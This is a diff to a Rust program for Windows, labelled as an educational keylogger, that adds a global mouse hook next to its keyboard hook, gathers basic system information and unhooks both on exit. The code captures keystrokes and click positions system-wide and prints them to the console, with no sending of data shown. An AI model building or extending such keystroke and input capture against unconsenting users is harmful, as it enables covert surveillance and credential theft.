@@ -1,6 +1,19 @@
 use std::ptr;
 use winapi::shared::windef::HHOOK;
-use winapi::shared::minwindef::{HINSTANCE, LPARAM, LRESULT, WPARAM};
+use winapi::shared::minwindef::{LPARAM, LRESULT, WPARAM};
+use winapi::um::sysinfoapi::{GetSystemInfo, GetVersionExW, SYSTEM_INFO};
+use winapi::um::winuser::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
+use winapi::um::winnt::OSVERSIONINFOW;
+use std::mem;
+use winapi::um::winuser::GetCursorPos;
+use winapi::shared::windef::POINT;
+
+
+use winapi::um::winuser::{
+    CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
+    HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
+    WH_MOUSE_LL, MSLLHOOKSTRUCT, WM_LBUTTONDOWN, WM_RBUTTONDOWN, WM_MBUTTONDOWN,
+};
 
 /*
 This is a keylogger for educational purposes only.
@@ -88,6 +101,51 @@ mod encryption;
 mod classifier;
 mod scheduler;
 
+// Función para conseguir información básica del sistema
+fn get_basic_info() -> Result<(), Box<dyn std::error::Error>> {
+
+    unsafe {
+        // Obtener información del sistema
+        let mut system_info: SYSTEM_INFO = mem::zeroed();
+        GetSystemInfo(&mut system_info);
+        
+        // Obtener resolución de pantalla
+        let screen_width = GetSystemMetrics(SM_CXSCREEN);
+        let screen_height = GetSystemMetrics(SM_CYSCREEN);
+        
+        // Obtener información de la versión del OS
+        let mut os_info: OSVERSIONINFOW = mem::zeroed();
+        os_info.dwOSVersionInfoSize = mem::size_of::<OSVERSIONINFOW>() as u32;
+        GetVersionExW(&mut os_info);
+        
+        println!("=== SYSTEM INFORMATION ===");
+        println!("Screen Resolution: {}x{}", screen_width, screen_height);
+        println!("Processor Architecture: {}", system_info.u.s().wProcessorArchitecture);
+        println!("Number of Processors: {}", system_info.dwNumberOfProcessors);
+        println!("Page Size: {} bytes", system_info.dwPageSize);
+        println!("OS Version: {}.{}.{}", 
+                os_info.dwMajorVersion, 
+                os_info.dwMinorVersion, 
+                os_info.dwBuildNumber);
+        println!("=============================");
+    }
+    
+    Ok(())
+}
+
+// Función para obtener coordenadas del mouse
+fn get_mouse_coords() -> Result<(i32, i32), Box<dyn std::error::Error>> {
+    
+    unsafe {
+        let mut point: POINT = mem::zeroed();
+        if GetCursorPos(&mut point) != 0 {
+            Ok((point.x, point.y))
+        } else {
+            Err("Failed to get cursor position".into())
+        }
+    }
+}
+
 
 fn main() {
     
@@ -95,15 +153,24 @@ fn main() {
     // Initialize logger
     println!("Starting keylogger...");
     println!("Press Ctrl+C to stop...");
+    println!("Getting basic info");
+    if let Err(e) = get_basic_info() {
+        eprintln!("Error getting system info: {}", e);
+    }
+
 
 
     // Agregar manejo de señales para cleanup limpio
-    ctrlc::set_handler(move || { // esta linea es para capturar ctrl+c
+    ctrlc::set_handler(move || {
         println!("\nReceived Ctrl+C, cleaning up...");
         unsafe {
-            if !HOOK.is_null() { // si el hook está activo
+            if !HOOK.is_null() {
                 UnhookWindowsHookEx(HOOK);
-                println!("Hook removed successfully");
+                println!("Keyboard hook removed successfully");
+            }
+            if !MOUSE_HOOK.is_null() {
+                UnhookWindowsHookEx(MOUSE_HOOK);
+                println!("Mouse hook removed successfully");
             }
         }
         std::process::exit(0);
@@ -111,7 +178,7 @@ fn main() {
     
 
     // Iniciar captura de teclas
-    if let Err(e) = capture_keystroke() {
+    if let Err(e) = capture_input() {
         eprintln!("Error starting keylogger: {}", e);
         // Cleanup en caso de error
         unsafe {
@@ -126,13 +193,13 @@ fn main() {
 }
 
 
-use winapi::um::winuser::{
-    CallNextHookEx, GetMessageW, SetWindowsHookExW, UnhookWindowsHookEx,
-    HC_ACTION, KBDLLHOOKSTRUCT, MSG, WH_KEYBOARD_LL, WM_KEYDOWN, WM_SYSKEYDOWN,
-};
+
 
 static mut HOOK: HHOOK = ptr::null_mut();
+static mut MOUSE_HOOK: HHOOK = ptr::null_mut();
 
+
+// Callback para teclas
 unsafe extern "system" fn low_level_keyboard_proc(
     n_code: i32,
     w_param: WPARAM,
@@ -211,9 +278,51 @@ unsafe extern "system" fn low_level_keyboard_proc(
     unsafe { CallNextHookEx(HOOK, n_code, w_param, l_param) }
 }
 
-fn capture_keystroke() -> Result<(), Box<dyn std::error::Error>> {
+// Callback para clicks del mouse
+unsafe extern "system" fn low_level_mouse_proc(
+    n_code: i32,
+    w_param: WPARAM,
+    l_param: LPARAM,
+) -> LRESULT {
+    // si el código es HC_ACTION, procesar el evento
+    if n_code == HC_ACTION as i32 {
+        if w_param == WM_LBUTTONDOWN as usize { // left click
+            let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
+            println!("LEFT CLICK at: ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
+            
+            // Ejecutar get_mouse_coords cuando hay click
+            match get_mouse_coords() {
+                Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
+                Err(e) => eprintln!("Error getting mouse coords: {}", e),
+            }
+        } else if w_param == WM_RBUTTONDOWN as usize { // right click
+            let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
+            println!("RIGHT CLICK at: ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
+            
+            match get_mouse_coords() {
+                Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
+                Err(e) => eprintln!("Error getting mouse coords: {}", e),
+            }
+        } else if w_param == WM_MBUTTONDOWN as usize {
+            let mouse_struct = *(l_param as *const MSLLHOOKSTRUCT);
+            println!("MIDDLE CLICK at: ({}, {})", mouse_struct.pt.x, mouse_struct.pt.y);
+            
+            match get_mouse_coords() {
+                Ok((x, y)) => println!("Mouse coordinates: ({}, {})", x, y),
+                Err(e) => eprintln!("Error getting mouse coords: {}", e),
+            }
+        }
+        // Otros eventos de mouse que ignoramos
+    }
+    
+    unsafe { CallNextHookEx(MOUSE_HOOK, n_code, w_param, l_param) }
+}
+
+
+// Renombrar y actualizar la función para capturar tanto teclado como mouse
+fn capture_input() -> Result<(), Box<dyn std::error::Error>> {
     unsafe {
-        // Instalar hook de bajo nivel para capturar teclas del sistema
+        // Instalar hook de teclado
         HOOK = SetWindowsHookExW(
             WH_KEYBOARD_LL,
             Some(low_level_keyboard_proc),
@@ -225,16 +334,31 @@ fn capture_keystroke() -> Result<(), Box<dyn std::error::Error>> {
             return Err("Failed to install keyboard hook".into());
         }
         
-        println!("Keyboard hook installed successfully");
+        // Instalar hook de mouse
+        MOUSE_HOOK = SetWindowsHookExW(
+            WH_MOUSE_LL,
+            Some(low_level_mouse_proc),
+            ptr::null_mut(),
+            0,
+        );
         
-        // Loop de mensajes para mantener el hook activo
-        let mut msg: MSG = std::mem::zeroed(); // Inicializar MSG
+        if MOUSE_HOOK.is_null() {
+            UnhookWindowsHookEx(HOOK); // Cleanup del keyboard hook
+            return Err("Failed to install mouse hook".into());
+        }
+        
+        println!("Keyboard and mouse hooks installed successfully");
+        println!("Click anywhere or type to see input capture...");
+        
+        // Loop de mensajes para mantener ambos hooks activos
+        let mut msg: MSG = std::mem::zeroed();
         while GetMessageW(&mut msg, ptr::null_mut(), 0, 0) > 0 {
-            // El hook procesa automáticamente las teclas
+            // Los hooks procesan automáticamente los eventos
         }
         
         // Cleanup
         UnhookWindowsHookEx(HOOK);
+        UnhookWindowsHookEx(MOUSE_HOOK);
     }
     
     Ok(())
